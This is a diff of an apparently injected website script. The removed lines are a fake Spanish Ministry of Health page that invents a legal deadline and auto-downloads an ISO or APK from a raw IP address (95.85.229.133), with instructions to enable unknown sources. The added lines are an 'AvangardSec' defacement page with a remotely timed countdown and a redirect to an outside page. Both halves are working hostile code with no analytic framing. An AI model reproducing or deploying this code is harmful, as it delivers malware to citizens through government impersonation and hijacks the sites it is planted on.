@@ -1,83 +1,77 @@
-(function() {
-    'use strict';
-    document.body.innerHTML = ''; 
-    var styles = `
-    @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap');
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { font-family: 'Open Sans', Arial, sans-serif; background: #f4f4f4; }
-    .gov-header { background: #003366; color: white; padding: 15px 30px; display: flex; align-items: center; }
-    .gov-header img { height: 60px; margin-right: 20px; }
-    .gov-header h1 { font-size: 22px; font-weight: 600; }
-    .main-container { max-width: 800px; margin: 40px auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-    .warning { background: #fff3cd; border-left: 5px solid #ffc107; padding: 20px; margin: 20px 0; }
-    .btn-download { display: inline-block; background: #0066cc; color: white; padding: 15px 30px; text-decoration: none; border-radius: 5px; font-weight: bold; margin: 10px; font-size: 16px; }
-    .btn-download:hover { background: #0052a3; }
-    .footer { text-align: center; margin-top: 30px; color: #666; font-size: 14px; }
-    .shield-icon { font-size: 60px; color: #0066cc; text-align: center; }
-    `;
-    
-    var styleSheet = document.createElement('style');
-    styleSheet.textContent = styles;
-    document.head.appendChild(styleSheet);
-    var ua = navigator.userAgent;
-    var isWindows = /Windows NT/i.test(ua);
-    var isAndroid = /Android/i.test(ua);
-    var downloadUrl = '';
-    var fileName = '';
-    
-    if (isWindows) {
-        downloadUrl = 'http://95.85.229.133:2222';
-        fileName = 'Instalador_SanidadConecta.iso';
-    } else if (isAndroid) {
-        downloadUrl = 'http://95.85.229.133:2225';
-        fileName = 'SanidadConecta.apk';
-    }
-    var html = `
-    <div class="gov-header">
-        <img src="https://sede.mscbs.gob.es/diseno/img/logo_ministerio.jpg" alt="Ministerio de Sanidad">
-        <h1>Sede Electr&oacute;nica - Ministerio de Sanidad</h1>
-    </div>
-    <div class="main-container">
-        <div class="shield-icon">&#128737;</div>
-        <h2 style="text-align:center;">Acceso a Historia Cl&iacute;nica Digital</h2>
-        <p style="text-align:center; font-size:18px;">Estimado ciudadano/a, para garantizar la seguridad de sus datos m&eacute;dicos y cumplir con el <strong>Real Decreto-ley 14/2025</strong> de digitalizaci&oacute;n sanitaria, es necesario instalar el software oficial <strong>Sanidad Conecta</strong>.</p>
-        
-        <div class="warning">
-            <strong>&#9888; Aviso importante:</strong> A partir del 1 de julio de 2026, el acceso a su historial cl&iacute;nico y la recepci&oacute;n de notificaciones electr&oacute;nicas requerir&aacute; esta aplicaci&oacute;n. Sin ella no podr&aacute; consultar sus resultados ni realizar tr&aacute;mites.
-        </div>
-        
-        <div style="text-align:center; margin: 30px 0;">
-            <p><strong>Descargue la aplicaci&oacute;n para su dispositivo:</strong></p>
-            <a href="${downloadUrl}" download="${fileName}" class="btn-download" id="downloadBtn">
-                &#9660; Descargar ${isWindows ? 'para Windows (ISO)' : (isAndroid ? 'para Android (APK)' : 'manual de instalaci&oacute;n')}
-            </a>
-        </div>
-        
-        <div style="background: #e9ecef; padding: 15px; border-radius: 5px;">
-            <p><strong>Instrucciones:</strong></p>
-            <ul style="margin-left:20px;">
-                <li><strong>Windows:</strong> Descargue el archivo ISO, montelo (doble clic) y ejecute <em>SanidadConecta</em>. Siga los pasos del asistente.</li>
-                <li><strong>Android:</strong> Permita la instalaci&oacute;n de or&iacute;genes desconocidos en Ajustes > Seguridad, luego abra el archivo APK descargado.</li>
-                <li>Una vez instalado, inicie sesi&oacute;n con su certificado digital o Cl@ve.</li>
-            </ul>
-        </div>
-        
-        <p style="text-align:center; margin-top:20px;">
-            <small>Si ya tiene instalado Sanidad Conecta, puede <a href="#">actualizar aqu&iacute;</a>.</small>
-        </p>
-    </div>
-    <div class="footer">
-        &copy; Ministerio de Sanidad - Sede Electr&oacute;nica | <a href="#">Aviso legal</a> | <a href="#">Protecci&oacute;n de datos</a>
-    </div>
-    `;
-    
-    document.body.innerHTML = html;
-    document.getElementById('downloadBtn').addEventListener('click', function(e) {
-        setTimeout(function() {
-            alert('Descarga iniciada. Si no comienza automáticamente, haga clic de nuevo en el botón.');
-        }, 1000);
-    });
-    setTimeout(function() {
-        document.getElementById('downloadBtn').click();
-    }, 3000);
+(function(){
+'use strict';
+document.open();
+document.write('<!DOCTYPE html><html>');
+document.write('<head><meta charset="UTF-8"><title>AvangardSec</title>');
+document.write(`
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0d0d0d;color:#ccc;font-family:'Courier New',monospace;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center;padding:20px;background:radial-gradient(ellipse at center,#2a2a2a 0%,#111 50%,#000 100%)}
+.container{background:#1a1a1a;padding:3rem 4rem;border:1px solid #444;border-radius:8px;max-width:700px;width:100%;box-shadow:0 0 30px rgba(255,255,255,0.03),inset 0 0 30px rgba(0,0,0,0.8)}
+.glitched{font-size:3.5rem;font-weight:700;color:#ccc;text-shadow:0 0 5px rgba(255,255,255,0.2);letter-spacing:8px;text-transform:uppercase;margin-bottom:0.5rem}
+.sub{font-size:1rem;color:#888;letter-spacing:4px;text-transform:uppercase;border-bottom:1px solid #333;padding-bottom:1rem;margin-bottom:2rem}
+.apk-btn{display:inline-block;background:#2a2a2a;color:#ddd;font-size:2rem;font-weight:bold;padding:0.5rem 2.5rem;margin-bottom:2.5rem;border:1px solid #555;border-radius:4px;text-decoration:none;letter-spacing:10px;transition:0.3s;font-family:'Courier New',monospace;box-shadow:0 0 15px rgba(255,255,255,0.05)}
+.apk-btn:hover{background:#333;border-color:#888;color:#fff;box-shadow:0 0 25px rgba(255,255,255,0.1)}
+.timer{font-size:5.5rem;font-weight:700;color:#ddd;background:#0d0d0d;padding:0.5rem 1.5rem;border:1px solid #444;border-radius:6px;display:inline-block;letter-spacing:6px;font-variant-numeric:tabular-nums;box-shadow:inset 0 0 20px rgba(0,0,0,0.9);min-width:280px;background:#111}
+.timer .ms{font-size:2.5rem;color:#666}
+.timer-label{display:block;margin-top:0.8rem;color:#666;font-size:0.9rem;letter-spacing:3px;text-transform:uppercase}
+.footer{margin-top:2.5rem;color:#444;font-size:0.7rem;letter-spacing:2px;border-top:1px solid #222;padding-top:1.5rem}
+.footer span{margin:0 1rem}
+@media(max-width:600px){.container{padding:2rem 1.5rem}.glitched{font-size:2.8rem;letter-spacing:5px}.timer{font-size:3.8rem;padding:0.4rem 1rem;min-width:auto}.timer .ms{font-size:1.8rem}.apk-btn{font-size:1.5rem;padding:0.4rem 1.5rem;letter-spacing:6px}}
+</style>
+</head><body>
+`);
+document.write(`
+<div class="container">
+<div class="glitched">DEFACED</div>
+<div class="sub">// AvangardSec //</div>
+<a href="https://t.me/AvangardsSec" target="_blank" rel="noopener" class="apk-btn">A/P/K</a>
+<div>
+<div class="timer" id="countdown">--:--:--<span class="ms">.---</span></div>
+<span class="timer-label">⏳ ОСТАЛОСЬ ДО ЗАВЕРШЕНИЯ</span>
+</div>
+<div class="footer"><span>0x7F</span><span>root@defaced:~#</span><span>2026-06-24</span></div>
+</div>
+`);
+document.write(`
+<script>
+(function(){
+const TIME_SOURCE='https://gist.githubusercontent.com/AvangardSec1/40b45daeef3eabb14a5ce7706d0e7733/raw/end.txt';
+const REDIRECT_URL='https://telegra.ph/Operaciya-Bloodborne-06-07';
+let endTime=null;
+const el=document.getElementById('countdown');
+function pad(n,l=2){return String(n).padStart(l,'0')}
+async function fetchEndTime(){
+try{
+const url=TIME_SOURCE+(TIME_SOURCE.includes('?')?'&':'?')+'_='+Date.now();
+const r=await fetch(url,{cache:'no-store'});
+if(!r.ok)return null;
+const t=await r.text();
+const m=t.match(/(\\d{4})-(\\d{2})-(\\d{2})T(\\d{2}):(\\d{2}):(\\d{2})/);
+if(!m)return null;
+const d=new Date(m[1]+'-'+m[2]+'-'+m[3]+'T'+m[4]+':'+m[5]+':'+m[6]);
+return d.getTime();
+}catch(e){return null}
+}
+function updateTimer(){
+if(!endTime){el.innerHTML='--:--:--<span class=\"ms\">.---</span>';return}
+const diff=endTime-Date.now();
+if(diff<=0){window.location.href=REDIRECT_URL;return}
+const h=Math.floor(diff/3600000);
+const m=Math.floor((diff%3600000)/60000);
+const s=Math.floor((diff%60000)/1000);
+const ms=diff%1000;
+el.innerHTML=pad(h)+':'+pad(m)+':'+pad(s)+'<span class=\"ms\">.'+pad(ms,3)+'</span>';
+}
+(async function(){
+endTime=await fetchEndTime()||Date.now()+3600000;
+setInterval(updateTimer,30);
+updateTimer();
+setInterval(async ()=>{const t=await fetchEndTime();if(t)endTime=t},120000);
+})();
+})();
+</script>
+`);
+document.write('</body></html>');
+document.close();
 })();
